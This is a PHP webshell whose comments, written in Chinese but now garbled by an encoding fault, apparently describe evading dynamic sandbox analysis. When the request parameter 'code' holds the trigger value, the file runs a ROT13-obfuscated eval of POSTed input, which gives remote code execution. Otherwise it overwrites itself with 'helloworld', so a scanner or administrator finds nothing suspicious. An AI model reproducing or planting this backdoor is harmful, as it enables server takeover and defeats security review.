<?php
    /*
        ���ڵ�PHP��webshell�ļ������õ��Ƕ�PHPִ���������hook���ж�̬���
        �����ǹ����һ��ɳ�䣬��Ŀ��ű�������ִ��һ�Σ�Ȼ���ִ�еĽ�������ж�
        �����ǵ�ɳ���ڴ�������ű�ִ�е�ʱ������û�и���׼ȷ�Ĳ���"code"���ͻᵼ�»����Ը�д"fwrite ($fp, $content)"�Ľ��
        ������ɳ���ִ�н������һ����ͨ���ı�"helloworld"

        Ȼ�󣬹���Ա��ȥ�鿴����ļ���ʱ�򣬿����ľ�ֻ��һ��"helloworld"��

        ����Ǻ����"PHP�Ķ�̬ɳ����"���ƹ���

        ����������ɳ��Ļ��ƣ�ɳ�䵼�����ļ��Ļٻ�
    */

    //$url = $_SERVER['PHP_SELF'];
    //$filename = end(explode('/',$url));
    //die($filename);
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>